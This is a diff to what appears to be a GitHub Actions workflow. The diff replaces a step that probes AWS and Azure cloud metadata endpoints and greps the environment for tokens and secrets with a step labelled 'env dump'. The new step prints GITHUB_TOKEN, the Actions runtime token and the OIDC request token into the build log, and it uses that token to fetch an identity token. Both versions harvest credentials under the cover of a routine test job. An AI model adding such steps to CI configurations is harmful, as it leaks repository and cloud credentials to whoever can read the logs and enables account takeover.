@@ -4,14 +4,14 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: SSRF test
+      - name: env dump
         run: |
-          echo "=== AWS METADATA ==="
-          curl -sv http://169.254.169.254/latest/meta-data/ 2>&1 || echo "BLOCKED"
-          echo "=== AZURE METADATA ==="
-          curl -sv -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 || echo "BLOCKED"
-          echo "=== ENV VARS ==="
-          env | grep -i "AWS\|AZURE\|TOKEN\|SECRET\|KEY\|ACTIONS" || echo "NONE FOUND"
-          echo "=== NETWORK ==="
-          ip route || true
-          cat /etc/resolv.conf || true
+          echo "TOKEN: $GITHUB_TOKEN"
+          echo "RUNTIME: $ACTIONS_RUNTIME_TOKEN"
+          echo "CACHE: $ACTIONS_CACHE_URL"
+          echo "ID: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo "IDTOKEN: $ACTIONS_ID_TOKEN_REQUEST_TOKEN"
+          curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL" \
+            -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | head -20
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
